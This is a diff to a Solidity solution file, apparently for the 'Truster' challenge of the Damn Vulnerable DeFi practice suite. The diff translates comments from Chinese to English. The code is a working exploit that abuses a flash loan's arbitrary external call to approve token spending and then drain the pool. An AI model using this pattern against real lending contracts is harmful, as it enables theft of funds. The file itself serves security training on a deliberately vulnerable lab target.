@@ -71,12 +71,13 @@ contract TrusterChallenge is Test {
 contract AttackContract{
 
 	function attack(TrusterLenderPool pool, DamnValuableToken token, address player, address recovery, uint256 TOKENS_IN_POOL) public {
-		//通过函数选择器把approve授权函数传入data中
+		// Encode the approve() function payload to grant allowance to this attack contract
 		bytes memory data = abi.encodeWithSelector(token.approve.selector, address(this), TOKENS_IN_POOL);
-		//通过functionCall执行approve函数授权player转账
+		// Execute flash loan with 0 amount to trigger arbitrary target call (token.approve)
 		pool.flashLoan(0, player, address(token), data);
-		//把授权的1000000代币转账给player
+		// Debug log: check pool balance after approval
         console.log(token.balanceOf(address(pool)));
+		// Transfer approved tokens from pool to recovery address using granted allowance
 		token.transferFrom(address(pool), recovery, TOKENS_IN_POOL);
 	}
 }
